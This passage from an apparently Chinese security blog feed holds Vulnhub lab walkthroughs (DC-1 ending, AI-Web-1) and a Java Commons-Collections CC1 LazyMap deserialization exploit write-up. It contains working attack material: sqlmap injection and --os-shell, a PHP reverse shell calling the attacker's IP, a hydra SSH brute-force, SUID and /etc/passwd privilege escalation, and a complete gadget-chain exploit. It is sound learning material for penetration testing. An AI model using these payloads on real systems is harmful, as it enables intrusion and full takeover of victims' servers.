src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334420.png" alt="image-20230503133444394"><br>看一下用户权限，只是一个普通用户<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031334760.png" alt="image-20230503133458731"><br>根据flag1提示看一下配置文件，通过百度得到配置文件名settings.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat `find / -name settings.php`</span><br></pre></td></tr></table></figure><p>这里也可以使用命令<code>find . -name &quot;set*&quot;</code>搜到配置文件<br>拿到flag2和一个数据库<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335864.png" alt="image-20230503133518795"></p><h2 id="flag3，拿下数据库"><a href="#flag3，拿下数据库" class="headerlink" title="flag3，拿下数据库"></a>flag3，拿下数据库</h2><p>登入数据库<br><code>mysql -udbuser -pR0ck3t</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335424.png" alt="image-20230503133539364"><br>然后就是查看一下数据库里面的东西<br><code>show databases;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031335139.png" alt="image-20230503133553088"><br><code>use drupaldb;show tables;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336614.png" alt="image-20230503133605586"><br>查看这个users表<br><code>select * from users\G;</code><br>这里<code>\G</code>就是纵向显示数据<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336167.png" alt="image-20230503133616089"><br>得到两个用户，不过密码不是明文，模糊搜索一下看看有没有加密脚本<br><code>find . -name &quot;*hash*&quot;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336085.png" alt="image-20230503133629051"><br>找到加密脚本，简单运行一下看看<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336935.png" alt="image-20230503133639889"><br>这里应该就是直接在后面加上密码就可以得到密文，反正就是多尝试<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031336174.png" alt="image-20230503133652131"><br>这里我们想试出admin的密码很难，所以我们就直接在数据库里面进行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DQg60FlJLrmVGTkV6v6xnQKJGLPv9Bq5mNizW6/kv0IeIyA.2dyd&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span>&quot;admin&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337238.png" alt="image-20230503133707194"><br>替换成功，然后登录看看<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337851.png" alt="image-20230503133717797"><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337379.png" alt="image-20230503133727343"><br>在这里找到flag3</p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>根据flag3提示，打开&#x2F;etc&#x2F;passwd看看<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337479.png" alt="image-20230503133743399"><br>得到flag4用户，并且在用户目录下可以找到flag4，这里也可以使用工具Hydra去爆破用户ssh密码远程登录<br><code>hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.75.133</code><br>但是既然能直接打开没必要去爆破<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031337304.png" alt="image-20230503133756258"><br>提示root目录但是没有权限打开，开始提权</p><h2 id="flag5，suid提权"><a href="#flag5，suid提权" class="headerlink" title="flag5，suid提权"></a>flag5，suid提权</h2><p>利用find命令，找查具有SUID权限的可执行二进制文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">find 指令  </span><br><span class="line">/ 根目录(查找位置)  </span><br><span class="line">-perm 权限  </span><br><span class="line">-u 用户(s=特权)  </span><br><span class="line">-type 类型  </span><br><span class="line">f 文件  </span><br><span class="line">2&gt;/dev/nul 过滤错误信息(不显示错误信息)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338317.png" alt="image-20230503133811249"><br>find命令在里面可以直接使用它来提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -exec &quot;/bin/sh&quot; \;</span><br><span class="line"></span><br><span class="line">找查什么文件不重要（但是是存在的文件），只需要格式对，然后后面加上</span><br><span class="line">-exec &quot;/bin/sh&quot; \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338793.png" alt="image-20230503133821756"><br>提权成功，然后进入root目录查看<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305031338643.png" alt="image-20230503133830589"><br>找到最后一个flag，打靶结束</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--Ai-Web1</title>
      <link href="/undefined/59799.html"/>
      <url>/undefined/59799.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>直接下载靶机然后解压，VMware上运行vmx文件就行，<a href="https://www.vulnhub.com/entry/ai-web-1,353/">靶机链接</a><br>运行靶机会有要密码登录，别管就行，因为渗透已经开始了！！</p><h2 id="开始打靶"><a href="#开始打靶" class="headerlink" title="开始打靶"></a>开始打靶</h2><p>使用netdiscover扫描ip<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012014759.png" alt="image-20230501201446634"><br>挨个访问，最终发现192.168.75.132这个IP可疑<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015300.png" alt="image-20230501201508266"><br>nmap扫描一下这个IP 查看开放端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sV -O -A -P 192.168.75.132</span><br><span class="line">-T4(速度) -sV(版本扫描和开启的服务) -O(操作系统) -p-（全部端口</span><br><span class="line">这里其实用-A就可以，主要时熟悉一下参数</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015178.png" alt="image-20230501201519095"><br>可以看到80端口开放也就是我们一开始访问的那个页面，直接扫一下目录<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015905.png" alt="image-20230501201529877"><br>存在一个robots.txt<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015947.png" alt="image-20230501201540911"><br>emmmm，两个都是403，然后对着这个两个路径扫一下，扫到一个<code>http://192.168.75.132/m3diNf0/info.php</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012015714.png" alt="image-20230501201552683"><br>网站的绝对路径，然后扫另一个<code>http://192.168.75.132/se3reTdir777</code>这里一开始扫的uploads但是没有东西然后就扫了这个，看wp有的是用的kali下的dirb，涨姿势了以前都不知道这个工具<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016438.png" alt="image-20230501201605406"><br>访问index.php，中途断开连接了还以为是题目的设定。。。访问得到下面的表单<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016204.png" alt="image-20230501201615163"></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>使用<code>1&#39;</code>探测是否存在sql注入，发现报错<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016498.png" alt="image-20230501201626465"><br>然后使用<code>1&#39;#</code>正常sql注入没跑了<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016645.png" alt="image-20230501201634617"><br>抓个包得到参数，因为是post注入直接保存一下这个包然后丢sqlmap先跑一下，毕竟不是ctf题应该能跑出来<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012016931.png" alt="image-20230501201645892"><br><code>python sqlmap.py -r &quot;E:\vuluhub靶场\AI Web 1.0\做题\1.txt&quot; -p uid --dbs</code>执行命令直接跑，跑的时候手工测了一下发现union没法注因为没有回显，然后发现存在延时注入，果然sqlmap一开始没注出来<br><code>python sqlmap.py -r &quot;E:\vuluhub靶场\AI Web 1.0\做题\1.txt&quot; -p uid --technique=T --dbs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap指定注入类型</span><br><span class="line">--technique=T</span><br><span class="line">B:布尔盲注</span><br><span class="line">E:报错注入</span><br><span class="line">U:联合查询注入</span><br><span class="line">S:文件系统,操作系统,注册表相关</span><br><span class="line">T:时间盲注</span><br></pre></td></tr></table></figure><p>这两种方式都没注出来。。。看看wp怎么注的吧<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --dbs</code><br>好吧，直接指定参数注<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017136.png" alt="image-20230501201714088"><br>emmm，kali下的sqlmap这么快的吗，一直用的Windows下的，看看aiweb1<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --tables -D aiweb1</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017717.png" alt="image-20230501201722682"><br>看字段<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --columns -D aiweb1 -T user</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017314.png" alt="image-20230501201733277"><br>没啥东西，直接拿shell吧<br><code>sqlmap -u &quot;http://192.168.75.132/se3reTdir777/index.php#&quot; --data &quot;uid=1&amp;Operation=Submit&quot;  --os-shell</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012017902.png" alt="image-20230501201755826"><br>下面的2为自定义上传路径结合我们刚刚得到的绝对路径就能知道马的位置，通过下面的操作能知道权限，不知道为什么whoami命令没有输出，难道没有？？<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018282.png" alt="image-20230501201810247"><br>知道绝对路径那就写个一句话木马进入，sqlmap的马蚁剑连不上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.132/se3reTdir777&quot; --data &quot;uid=1&amp;Operation=Submit&quot; --file-write ./2.php --file-dest /home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/2.php</span><br><span class="line"></span><br><span class="line">--file-write:去读取文件(1.php)</span><br><span class="line">--file-dest:后面加目标的绝对路径 已经生成木马的名称（1.php）</span><br></pre></td></tr></table></figure><p>这里不知道为什么一样的命令wp能上传上去我不行，既然一句话传不上去那就直接尝试反弹shell</p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>准备一个反弹shell的php文件,，IP为kali IP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.75.128&quot;</span>,<span class="number">6666</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用python搭建一个简易的web服务，这里python内置了模块只需要执行命令就行，下面为python3环境</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server <span class="number">9999</span></span><br><span class="line"><span class="comment">#9999为端口号，可自己指定</span></span><br></pre></td></tr></table></figure><p>然后就会在页面显示当前目录的文件，如果有默认的index.html文件就会优先显示，这里又有个坑就是我文件放在桌面它不显示，不知道为什么<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018642.png" alt="image-20230501201822611"><br>然后在靶机上使用wget下载shell文件<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018555.png" alt="image-20230501201833498"><br>建立监听，然后在靶机上运行shell.php<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012018907.png" alt="image-20230501201842818"><br>这里一次没成功多试几下就行，查看权限为www-data，下面开始提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行命令<code>ls -l /etc/passwd</code>可以看到当前用户对etc&#x2F;passwd文件具有rw(读写)权限<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019372.png" alt="image-20230501201935342"><br>写入的时候密码是加密的，所以要先加密密码：<br><code> openssl passwd -1 -salt web1 123456</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012019455.png" alt="image-20230501201943426"><br>然后写入密码<br><code>echo &#39;web1:$1$web1$ZrYgDZgZpLlsnVlxUaZwh/:0:0::/root:/bin/bash&#39; &gt;&gt;/etc/passwd</code><br>直接切换用户会报错<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021388.png" alt="image-20230501202106358"><br>转换为交互式shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021499.png" alt="image-20230501202135452"><br>可以看到权限已经是root了，flag在root目录下<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202305012021654.png" alt="image-20230501202154593"><br>第一次做这种靶场还挺有意思</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CC链1--LazyMap链</title>
      <link href="/undefined/36068.html"/>
      <url>/undefined/36068.html</url>
      
        <content type="html"><![CDATA[<h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>这里我直接拿cc1的demo改了，首先进入<code>InvokerTransformer</code>下的<code>transform</code>方法然后find usages<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819199.png" alt="image-20230430181911069"><br>可以看到LazyMap下也调用了<code>transform</code>方法，直接进去看代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;  </span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map  </span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>public型<code>get</code>方法调用了<code>transform</code>方法，然后去看factory<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819343.png" alt="image-20230430181932250"><br>然后这里同时还有decorate方法和<code>TransformMap</code> 中的 <code>decorate</code> 方法是一样的作用，然后去看这个类的构造函数为<code>protected</code>所以得通过decorate方法获得LazyMap类的对象去调用<br>先写个exp弹计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>  </span><br><span class="line">                (<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">Mapdecorate</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer);  </span><br><span class="line">        <span class="comment">//相当于装饰器，即此时Mapdecorate也有invokerTransformer对象的功能  </span></span><br><span class="line">  </span><br><span class="line">        Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;  </span><br><span class="line">        <span class="type">Method</span> <span class="variable">classDeclaredMethod</span> <span class="operator">=</span> lazyMapClass.getDeclaredMethod(<span class="string">&quot;get&quot;</span>, Object.class);  </span><br><span class="line">        classDeclaredMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        classDeclaredMethod.invoke(Mapdecorate,runtime);  </span><br><span class="line">        <span class="comment">//最后这里调用了LazyMap的get方法里面执行了transform方法，参数为runtime  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301819409.png" alt="image-20230430181951307"><br>证明这条链到目前是可行的，然后找谁调用了LazyMap中的get方法，最终目标是找到readObject<br>这里在AnnotationInvocationHandler类下的invoke方法中调用了get方法，这里find usages get方法的话结果很多，所以我直接在CC1的另一条链中进入这个方法<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820476.png" alt="image-20230430182006425"><br>同时这个类中也存在readObject方法，相当于找到入口，而且通过构造方法发现这个memberValue也是可控的，所以现在是解决怎么进入这个类的invoke方法，这里就可以结合动态代理，一个类被动态代理之后想要通过代理调用这个类必须通过invoke方法，继续寻找<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820664.png" alt="image-20230430182018517"><br>可以看到在readObject方法中memberValues调用了entrySet方法，所以这里让memberValues成为代理对象那么调用entrySet方法时就会进入invoke方法</p><h2 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//用于解决第一个问题，Runtime不能被序列化  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = LazyMap.decorate(hashMap,  chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);  </span><br><span class="line">  </span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  </span><br><span class="line">        <span class="comment">//InvocationHandler解决proxyMap不能序列化，然后通过构造方法将代理对象proxyMap赋值给memberValues  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化与反序列化  </span></span><br><span class="line">        serialize(invocationHandler);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304301820365.png" alt="image-20230430182035279"></p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">InvokeTransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">AnnotationInvocationHandler#readObject</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">辅助链</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>这个流程图懒得画了，开摆</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java学习之CC链1</title>
      <link href="/undefined/45527.html"/>
      <url>/undefined/45527.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>感觉最近Java考的用的很多，自己对于Java是0基础，让我迫切想要开始学，看了大佬的学习链是从开发开始，那样感觉就太慢了而且自己对于开发兴趣不大，但是偏偏又离不开开发，只能边学开发边看安全，虽然有点急了但是也没办法了</p><h2 id="一点建议"><a href="#一点建议" class="headerlink" title="一点建议"></a>一点建议</h2><p>如果没有学过Java或者不了解idea的操作的话开始CC链之前强烈建议先跟URLDNS链，把该踩的坑踩了再弄CC链会顺畅很多</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里我就列一下自己踩的坑，作为一个对Java和idea不熟悉的新手容易犯的错</p><h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><p>jdk要求是jdk8u65，在官网我下载的时候选择8u65但是下载的却不是，<a href="https://blog.lupf.cn/articles/2022/02/20/1645352101537.html">另外的平台</a><br>安装会同时安装jdk和jre我们需要的是jdk不要把jre也放在jdk目录下，不然idea导入jdk会失败下载完的目录如下<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262142103.png" alt="image-20230426214158005"></p><h3 id="加入依赖"><a href="#加入依赖" class="headerlink" title="加入依赖"></a>加入依赖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;  </span><br><span class="line">    